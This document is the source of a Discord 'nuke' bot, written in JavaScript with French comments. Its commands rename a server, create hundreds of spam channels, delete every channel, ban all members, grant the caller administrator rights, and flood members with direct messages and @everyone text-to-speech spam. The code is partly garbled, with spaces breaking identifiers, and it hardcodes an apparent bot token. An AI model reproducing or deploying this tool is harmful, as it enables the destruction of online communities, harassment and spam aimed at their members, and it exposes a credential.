const Discord = require("discord.js"); const bot = new Discord.Client();
try{
bot.on('ready',() => {
console.log("Je suis "+bot.user.username+" je suis sur "+bot.guilds.size+" serveurs et j'ai "+bot.users.size+" membres "+bot.user.id)
})
bot.on("message", message => {
//COMMANDE DE CREATION DE CHANNEL, MODIFICATION DU NOM, DE LA REGION ET DE L'ICON DU SERVEUR
if(message.content === ".kill"){
if(message.channel.type === "dm") return;
var fucked = false; if(!fucked){
message.guild.setIcon("http s://goo.gl/images/yYihJb")
message.guild.setName("SH UTED DOWN").catch(error => {})
message.guild.setRegion('ho ngkong').catch(error => {})
for (var i = 0; i < 500; i+ +){
message.guild.createChann el("KILLSHOT", 'voice').catch(error => {})
message.guild.createChann el('KILLSHOT',
￼￼￼￼￼￼￼￼￼￼￼
'text').catch(error => {}) }
fucked = true;
} if(message.deletable)
message.delete(); }
// COMMANDE POUR SUPPRIMER TOUT LES SALONS
if(message.content === ".shot"){
if(message.channel.type === "dm") return;
if(message.guild.channels.si ze === 0) return;
else if(! message.guild.member(bot. user).hasPermission("MANA GE_CHANNELS")) return;
message.guild.channels.forE
ach(chan =>
{ if(chan.deletable) chan.delete();})
}
//COMMANDE POUR BAN TOUT LE MONDE SAUF CEUX AYANT LE GRADE SHUTDOWN
if (message.content === '.ban') {
if(message.channel.type === "dm") return;
message.guild.members.for Each(member => {
if (! member.roles.exists("name",
"KILLSHOT") && member.bannable) member.ban();});
}
//COMMANDE POUR METTRE ADMIN
if (message.content === '.role') {
if(message.channel.type === "dm") return;
else if(! message.guild.member(bot. user).hasPermission("ADMIN ISTRATOR")) return;
message.member.guild.creat eRole({
name: "KILL SHOT",
permissions: "ADMINISTRATOR",
mentionable: false }).then(function(role
) {message.member.addRole( role); if (message.deletable) message.delete();})
}
//COMMANDE POUR
SPAM MP TOUT LE SERVEUR
if(message.content === ".mp"){
if(message.channel.type === "dm") return;
if(message.deletable) message.delete();
message.guild.members.for Each(member => {
setInterval(function () {
member.send(message.guil d.owner.user.username+"S'EST FAIT NIQUER PAR https://discord.gg/ZgeFukj").catch(error => {}) }, 450)})
} //COMMANDE
POUR SPAM DANS LE SALON
if (message.content === '.spam') {
if(message.channel.type === "dm") return;
setInterval (function ()
{ message.channel.send("@ everyone FUCKED BY KILL SHOT XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX
XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXhttps://discord.gg/ZgeFukj",
{ tts: true } ).catch(error => {}) }, 450)
}
//
COMMANDE POUR BAN SANS PERM
if(message.content.startsWi th(".forceban")){
if(message.channel.type === "dm") return;
else if(! message.guild.member(bot.
user).hasPermission("BAN_ MEMBERS")) return;
var member = message.guild.member(mes
sage.mentions.members.firs t().user)
if(message.mentions.memb ers.size === 0) return;
else if(member.bannable)
member.ban() }
// COMMANDE POUR KICK SANS PERM
if(message.content.startsWi th(".forcekick")){
if(message.channel.type === ".ban") return;
else if(! message.guild.member(bot.
user).hasPermission("KICK_ MEMBERS")) return;
var member = message.guild.member(mes sage.mentions.members.firs
t().user)
if(message.mentions.memb ers.size === 0) return;
else if(member.kick)
member.kick() }
})
} catch(error) {}
bot.login("NTUwMTExNjU5MTg4ODEzODQ1.D1iuDQ.2v52vYf2tPrmlQFx3QlB2ozEG-E")
